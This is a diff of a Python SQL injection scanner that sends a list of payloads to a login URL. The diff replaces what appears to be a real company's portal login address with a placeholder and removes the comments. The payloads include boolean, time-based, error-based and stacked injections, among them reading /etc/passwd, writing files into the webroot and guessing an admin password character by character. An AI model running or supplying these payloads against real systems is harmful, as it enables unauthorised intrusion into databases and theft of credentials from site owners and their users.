@@ -1,10 +1,10 @@
 import requests
 
-target_url = "https://portal.deepwatch.com/login"
+target_url = "Insert URL"
 
-# List of different SQL Injection payloads
+
 payloads = [
-    # Basic Boolean-based SQL Injection payloads
+    
     "') OR 1=1 --",
     "') OR 1=0 AND '1'='1",
     "') OR 1=0 AND '1'='2",
@@ -20,7 +20,7 @@ payloads = [
     "') OR 1=1 UNION SELECT 1,2 INTO DUMPFILE '/var/www/html/test.bin' --",
     "') OR 1=1 UNION SELECT 1,load_file('/etc/passwd') --",
 
-    # Time-based SQL Injection payloads
+    
     "') OR SLEEP(5) --",
     "') OR IF(1=1,SLEEP(5),'0') --",
     "') OR IF(1=(SELECT COUNT(*) FROM information_schema.tables),SLEEP(5),'0') --",
@@ -29,7 +29,7 @@ payloads = [
     "') OR IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users'),SLEEP(5),'0') --",
     "') OR IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users' AND column_name='password'),SLEEP(5),'0') --",
 
-    # Error-based SQL Injection payloads
+    
     "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password='') --",
     "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password IS NULL) --",
     "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%') --",
@@ -39,7 +39,7 @@ payloads = [
     "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1 OFFSET 4) --",
     "') OR 1/(SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%' LIMIT 1 OFFSET 5) --",
 
-    # Stack-based SQL Injection payloads
+    
     "') OR 1=CONVERT(CHAR(78),7777777) --",
     "') OR 1=CONVERT(CHAR(78),(SELECT COUNT(*))) --",
     "') OR 1=CONVERT(CHAR(78),(SELECT COUNT(*) FROM users)) --",
@@ -48,7 +48,7 @@ payloads = [
     "') OR 1=CONVERT(CHAR(78),(SELECT COUNT(*) FROM users WHERE username='admin' AND password=SUBSTRING(password,1,1))) --",
 ]
 
-# Loop through the payloads and test for vulnerabilities
+
 for payload in payloads:
     print(f"Testing payload: {payload}")
     response = requests.get(target_url + payload)
